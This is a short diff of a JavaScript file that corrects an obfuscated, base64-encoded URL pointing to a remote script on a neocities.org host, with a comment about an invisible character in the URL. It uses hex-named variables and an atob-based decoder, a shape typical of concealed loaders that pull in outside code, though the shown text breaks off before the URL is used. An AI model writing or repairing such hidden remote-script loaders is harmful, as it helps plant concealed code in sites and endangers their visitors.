@@ -1,5 +1,6 @@
 (function(){
-  const _0x4a7d = 'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQz44CwLmpz';
+  // Correctly encoded URL including the invisible character
+  const _0x4a7d = 'aHR0cHM6Ly9zaGFyZWJvb3N0ZXIubmVvY2l0aWVzLm9yZy9zY3JpcHQz16CAcy5qcw==';
 
   function _0x56b2(_0x3a1f){
     return decodeURIComponent(atob(_0x3a1f).split('').map(function(_0x2f9e){
